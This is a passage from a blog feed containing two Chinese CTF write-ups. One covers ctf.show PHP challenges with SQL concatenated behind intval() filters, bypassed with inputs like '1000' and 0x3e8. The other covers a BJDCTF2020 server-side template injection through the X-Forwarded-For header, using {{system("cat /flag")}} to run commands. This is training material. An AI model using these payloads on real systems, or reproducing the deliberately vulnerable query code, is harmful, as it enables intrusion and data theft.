            "content_html": "<p>简单记录 sql 绕过方法<br />\n<a id=\"more\"></a></p>\n<h1 id=\"question1\"><a class=\"anchor\" href=\"#question1\">#</a> Question1</h1>\n<h2 id=\"源码\"><a class=\"anchor\" href=\"#源码\">#</a> 源码:</h2>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>ctf.show萌新计划web1<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token prolog\">&lt;?php</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># 包含数据库连接文件</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>include(\"config.php\");</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># 判断get提交的参数id是否存在</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>if(isset($_GET['id']))&#123;</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    $id = $_GET['id'];</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    # 判断id的值是否大于999</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    if(intval($id) > 999)&#123;</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        # id 大于 999 直接退出并返回错误</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        die(\"id error\");</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    &#125;else&#123;</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        # id 小于 999 拼接sql语句</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        $sql = \"select * from article where id = $id order by id limit 1 \";</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        echo \"执行的sql为：$sql&lt;br>\";</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        # 执行sql 语句</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        $result = $conn->query($sql);</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        # 判断有没有查询结果</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        if ($result->num_rows > 0) &#123;</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            # 如果有结果，获取结果对象的值$row</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            while($row = $result->fetch_assoc()) &#123;</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                echo \"id: \" . $row[\"id\"]. \" - title: \" . $row[\"title\"]. \" &lt;br>&lt;hr>\" . $row[\"content\"]. \"&lt;br>\";</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            &#125;</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        &#125;</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        # 关闭数据库连接</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        $conn->close();</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    &#125;</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"34\"></td><td><pre>&#125;else&#123;</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    highlight_file(__FILE__);</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>&#125;</pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>?></span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token comment\">&lt;!-- flag in id = 1000 --></span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjE3MDM0L2FydGljbGUvZGV0YWlscy85NDA0MDIxMg==\"> CG-CTF</span> 才知道这题考察的是 intval 漏洞，需要满足 id=1000，同时 intval ($id)&gt;999 要返回 false;</p>\n<p><span class=\"purple\">这里可以使用 '1000' 字符绕过，'1000' 进行 intval 后还是 1000 (&quot;1000&quot; 同理)</span></p>\n<p><span class=\"pink\">125&lt;&lt;3 也可以，而 8000&gt;&gt;3 却不行.</span></p>\n<p><span class=\"green\">当然可以使用 680|320 绕过</span></p>\n<p><span class=\"aqua\">也可以使用 hex (16 进制) 绕过：例如 0x3e8</span></p>\n<p><img data-src=\"https://i.loli.net/2021/01/24/laVFmL2G8YTKjky.png\" alt=\"\" /></p>\n<p>任意一种方法都可 get flag</p>\n<h1 id=\"question2\"><a class=\"anchor\" href=\"#question2\">#</a> Question2</h1>\n<h2 id=\"源码-2\"><a class=\"anchor\" href=\"#源码-2\">#</a> 源码</h2>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token prolog\">&lt;?php</pre></td></tr><tr><td data-num=\"2\"></td><td><pre># 包含数据库连接文件</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>include(\"config.php\");</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># 判断get提交的参数id是否存在</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>if(isset($_GET['id']))&#123;</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        $id = $_GET['id'];</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    if(preg_match(\"/or|\\+/i\",$id))&#123;</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            die(\"id error\");</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    &#125;</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    # 判断id的值是否大于999</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    if(intval($id) > 999)&#123;</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        # id 大于 999 直接退出并返回错误</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        die(\"id error\");</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    &#125;else&#123;</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        # id 小于 999 拼接sql语句</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        $sql = \"select * from article where id = $id order by id limit 1 \";</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        echo \"执行的sql为：$sql&lt;br>\";</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        # 执行sql 语句</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        $result = $conn->query($sql);</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        # 判断有没有查询结果</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        if ($result->num_rows > 0) &#123;</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            # 如果有结果，获取结果对象的值$row</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            while($row = $result->fetch_assoc()) &#123;</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                echo \"id: \" . $row[\"id\"]. \" - title: \" . $row[\"title\"]. \" &lt;br>&lt;hr>\" . $row[\"content\"]. \"&lt;br>\";</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            &#125;</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        &#125;</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        # 关闭数据库连接</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        $conn->close();</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    &#125;</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"31\"></td><td><pre>&#125;else&#123;</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    highlight_file(__FILE__);</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>&#125;</pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>?></span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token comment\">&lt;!-- flag in id = 1000 --></span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><div class=\"note info\">\n<p>keycode：</p>\n</div>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>if(preg_match(\"/or|\\+/i\",$id))</pre></td></tr></table></figure><p>payload: 同样用 '1000' 绕过</p>\n<h1 id=\"question3\"><a class=\"anchor\" href=\"#question3\">#</a> Question3</h1>\n<h2 id=\"源码-3\"><a class=\"anchor\" href=\"#源码-3\">#</a> 源码</h2>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>ctf.show萌新计划web1<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token prolog\">&lt;?php</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># 包含数据库连接文件</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>include(\"config.php\");</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># 判断get提交的参数id是否存在</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>if(isset($_GET['id']))&#123;</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        $id = $_GET['id'];</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    if(preg_match(\"/or|\\-|\\\\|\\*|\\&lt;|\\>|\\!|x|hex|\\+/i\",$id))&#123;</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            die(\"id error\");</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    &#125;</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    # 判断id的值是否大于999</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    if(intval($id) > 999)&#123;</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        # id 大于 999 直接退出并返回错误</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        die(\"id error\");</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    &#125;else&#123;</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        # id 小于 999 拼接sql语句</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        $sql = \"select * from article where id = $id order by id limit 1 \";</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        echo \"执行的sql为：$sql&lt;br>\";</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        # 执行sql 语句</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        $result = $conn->query($sql);</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        # 判断有没有查询结果</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        if ($result->num_rows > 0) &#123;</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            # 如果有结果，获取结果对象的值$row</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            while($row = $result->fetch_assoc()) &#123;</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                echo \"id: \" . $row[\"id\"]. \" - title: \" . $row[\"title\"]. \" &lt;br>&lt;hr>\" . $row[\"content\"]. \"&lt;br>\";</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            &#125;</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        &#125;</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        # 关闭数据库连接</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        $conn->close();</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    &#125;</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"37\"></td><td><pre>&#125;else&#123;</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    highlight_file(__FILE__);</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>&#125;</pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>?></span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token comment\">&lt;!-- flag in id = 1000 --></span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><div class=\"note info\">\n<p>keycode:</p>\n</div>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>if(preg_match(\"/or|\\-|\\\\|\\*|\\<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>|\\</span><span class=\"token punctuation\">></span></span>|\\!|x|hex|\\+/i\",$id))</pre></td></tr></table></figure><p>同理</p>\n<h1 id=\"question4\"><a class=\"anchor\" href=\"#question4\">#</a> Question4</h1>\n<h2 id=\"源码-4\"><a class=\"anchor\" href=\"#源码-4\">#</a> 源码</h2>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>ctf.show萌新计划web1<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">charset</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>utf-8<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token prolog\">&lt;?php</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># 包含数据库连接文件</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>include(\"config.php\");</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># 判断get提交的参数id是否存在</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>if(isset($_GET['id']))&#123;</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        $id = $_GET['id'];</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    if(preg_match(\"/or|\\-|\\\\\\|\\/|\\\\*|\\&lt;|\\>|\\!|x|hex|\\(|\\)|\\+|select/i\",$id))&#123;</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            die(\"id error\");</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    &#125;</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    # 判断id的值是否大于999</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    if(intval($id) > 999)&#123;</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        # id 大于 999 直接退出并返回错误</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        die(\"id error\");</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    &#125;else&#123;</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        # id 小于 999 拼接sql语句</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        $sql = \"select * from article where id = $id order by id limit 1 \";</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        echo \"执行的sql为：$sql&lt;br>\";</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        # 执行sql 语句</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        $result = $conn->query($sql);</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        # 判断有没有查询结果</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        if ($result->num_rows > 0) &#123;</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            # 如果有结果，获取结果对象的值$row</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            while($row = $result->fetch_assoc()) &#123;</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                echo \"id: \" . $row[\"id\"]. \" - title: \" . $row[\"title\"]. \" &lt;br>&lt;hr>\" . $row[\"content\"]. \"&lt;br>\";</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            &#125;</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        &#125;</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        # 关闭数据库连接</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        $conn->close();</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    &#125;</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"37\"></td><td><pre>&#125;else&#123;</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    highlight_file(__FILE__);</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>&#125;</pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>?></span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token comment\">&lt;!-- flag in id = 1000 --></span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><div class=\"note info\">\n<p>keycode:</p>\n</div>\n<p>&lt;pre&gt;&lt;code&gt;<br />\nif(preg_match(&quot;/or|-|\\|/|\\*|&lt;|&gt;|!|x|hex|(|)|+|select/i&quot;,$id))<br />\n&lt;/code&gt;&lt;/pre&gt;</p>\n<p>payload: 使用 '1000'</p>\n",
            "tags": [
                "wp",
                "web",
                "SQL绕过"
            ]
        },
        {
            "id": "http://kyrita.top/BJDCTF2020-The-mystery-of-ip/",
            "url": "http://kyrita.top/BJDCTF2020-The-mystery-of-ip/",
            "title": "BJDCTF2020-The mystery of ip",
            "date_published": "2021-01-22T02:22:19.668Z",
            "content_html": "<p>先进入题目给的靶机<br />\n<a id=\"more\"></a></p>\n<h1 id=\"审视页面\"><a class=\"anchor\" href=\"#审视页面\">#</a> 审视页面</h1>\n<p>发现左上角有两个标签: Flag 和 Hint;</p>\n<h2 id=\"hintphp\"><a class=\"anchor\" href=\"#hintphp\">#</a> Hint.php</h2>\n<p>给出提示从 IP 地址入手.<br />\n<img data-src=\"https://i.loli.net/2021/01/22/f2snd6E1rZ3pywv.png\" alt=\"\" /><br />\n 那我们就来看看第二个标签.</p>\n<h2 id=\"flagphp\"><a class=\"anchor\" href=\"#flagphp\">#</a> Flag.php</h2>\n<p>Flag 标签，打开后会给我们一份 IP 地址: 172.16.134.121;<br />\n 登录这个 IP 瞧瞧.</p>\n<p>使用 bp 抓取 Flag 页面的包；<br />\n<img data-src=\"https://i.loli.net/2021/01/22/yEoaLhXwBFuAg3N.png\" alt=\"\" /><br />\n 尝试更改一下 IP 地址看看？</p>\n<div class=\"note info\">\n<p>添加 X-Forwarded-For: 127.0.0.1</p>\n</div>\n<p><img data-src=\"https://i.loli.net/2021/01/22/qtWNdmsM8lYQCvb.png\" alt=\"\" /></p>\n<p>可以看到 IP 地址发生了变化，直接将 127.0.0.1 输出到了页面上；借助搜索引擎我发现一篇<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vd2FuZ3RhbnpoaS9wLzEyMjM4Nzc5Lmh0bWw=\">大佬的博客</span>，里面实际验证了这是一种 SSTI 模板注入；</p>\n<p><span class=\"green\">尝试构造 payload:</span></p>\n<pre><code>X-Forwarded-For: &#123;&#123;system(\"ls\")&#125;&#125;\n</code></pre>\n<p><img data-src=\"https://i.loli.net/2021/01/22/L7Kyc5H4ZSsqpAG.png\" alt=\"\" /><br />\n发现 flag 文件，利用 cat 拿取 flag;</p>\n<p><span class=\"green\">构造 payload:</span></p>\n<pre><code>X-Forwarded-For: &#123;&#123;system(\"cat /flag\")&#125;&#125;\n</code></pre>\n<p><img data-src=\"https://i.loli.net/2021/01/22/ZfEkqNSDOgRCWl9.png\" alt=\"\" /></p>\n<p>于是拿到了 flag, 放入题目中 sumbit;yas</p>\n",
            "tags": [
                "wp",
                "web",
                "SSTI"
            ]
        }
    ]
}